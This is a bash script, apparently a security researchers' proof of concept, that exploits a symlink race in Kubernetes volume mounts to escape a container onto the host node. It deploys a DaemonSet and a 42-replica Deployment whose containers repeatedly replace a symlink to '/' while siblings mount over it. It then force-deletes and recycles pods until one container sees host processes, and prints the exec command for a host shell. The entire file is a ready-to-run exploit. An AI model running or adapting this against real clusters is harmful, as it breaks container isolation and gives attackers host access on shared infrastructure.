#!/usr/bin/env bash

# git.io/honk-symlink.sh by sig-honk
# Ian Coldwater @IanColdwater
# Rory McCune   @raesene
# Brad Geesaman @bradgeesaman
# Duffie Cooley @mauilion


#VARS 
REPLICAS=${REPLICAS:=42}

function wait-for-daemonset(){
    retries=10
    while [[ $retries -ge 0 ]];do
        sleep 3
        ready=$(kubectl -n $1 get daemonset $2 -o jsonpath="{.status.numberReady}")
        required=$(kubectl -n $1 get daemonset $2 -o jsonpath="{.status.desiredNumberScheduled}")
        if [[ $ready -eq $required ]];then
            echo "Succeeded"
            break
        fi
        ((retries--))
    done
}

echo "staging the nginx:stable image with a daemonset"
cat <<EOF | kubectl apply -f - 
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: honk-stage
  labels:
    app: honk-stage
spec:
  selector:
    matchLabels:
      app: honk-stage
  template:
    metadata:
      labels:
        app: honk-stage
    spec:
      containers:
      - name: honk-stage
        image: nginx:stable
        imagePullPolicy: IfNotPresent
EOF

echo "waiting for the image staging"
wait-for-daemonset default honk-stage

echo "Deploying the honk deployment."
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: honk
spec:
  replicas: $REPLICAS
  selector:
    matchLabels:
      app: honk
  template:
    metadata:
      labels:
        app: honk
    spec:
      containers:
      - image: nginx:stable
        imagePullPolicy: Never
        name: 0-link
        command: ["/bin/bash"]
        args: ["-c", "cd /honk; while true; do rm -rf host; ln -s / host; done;"]
        volumeMounts:
        - mountPath: /honk
          name: escape-volume
      - image: nginx:stable
        imagePullPolicy: Never
        name: 1-honk
        command: ["sleep", "infinity"]
        volumeMounts:
        - mountPath: /honk
          name: escape-volume
        - mountPath: /honk/host
          name: host-volume
      - image: nginx:stable
        imagePullPolicy: Never
        name: 2-honk
        command: ["sleep", "infinity"]
        volumeMounts:
        - mountPath: /honk
          name: escape-volume
        - mountPath: /honk/host
          name: host-volume
      - image: nginx:stable
        imagePullPolicy: Never
        name: 3-honk
        command: ["sleep", "infinity"]
        volumeMounts:
        - mountPath: /honk
          name: escape-volume
        - mountPath: /honk/host
          name: host-volume
      volumes:
      - name: escape-volume
        emptyDir: {}
      - name: host-volume
        emptyDir: {}
EOF

echo "Waiting for things to deploy for a 5 seconds before starting"
sleep 5

ATTEMPTS=1
while true; do 
  for POD in $(kubectl get pods -l app=honk -o name --sort-by=.metadata.creationTimestamp --field-selector=status.phase!=Terminating); do
    echo  "attempt $ATTEMPTS"
    COUNTER=1
    while [ $COUNTER -lt 4 ]; do
        echo -n "Checking $POD $COUNTER-honk for the host mount..."
        if [[ "$(kubectl exec -it $POD -c $COUNTER-honk -- find /proc -maxdepth 1 ! -name '*[!0-9]*' 2>/dev/null | wc -l )" -gt 5 ]]; then
          echo "SUCCESS after $ATTEMPTS attempts!"
          echo "Run kubectl exec -it $POD -c $COUNTER-honk -- bash"
          exit 0
        else
          echo "nope."
        fi
        let COUNTER=$COUNTER+1
      done
      kubectl delete $POD --force --wait=false --grace-period=0 2>/dev/null
  let ATTEMPTS=$ATTEMPTS+1
  done
done
